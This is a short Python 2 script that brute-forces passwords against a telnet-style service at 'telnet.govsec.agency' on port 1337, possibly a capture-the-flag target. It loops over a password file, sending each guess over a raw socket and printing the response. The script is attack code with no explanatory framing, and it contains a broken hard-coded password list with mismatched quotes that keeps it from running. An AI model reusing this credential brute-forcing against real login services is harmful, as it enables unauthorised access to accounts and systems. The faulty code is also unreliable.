import socket
import time

def conn(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

passwords = [123456”, “password”, “12345678”]
f = open('passes.txt','r')
passwds = f.read().split('\n')

host = 'telnet.govsec.agency'
port = 1337
size = 1024
for pas in passwds:
    s = conn(host,port)
    print s.recv(size)
    time.sleep(5)
    print "[+] sending: " + pas
    s.send(pas + '\n')
    time.sleep(1)
    print s.recv(size)
    s.close()
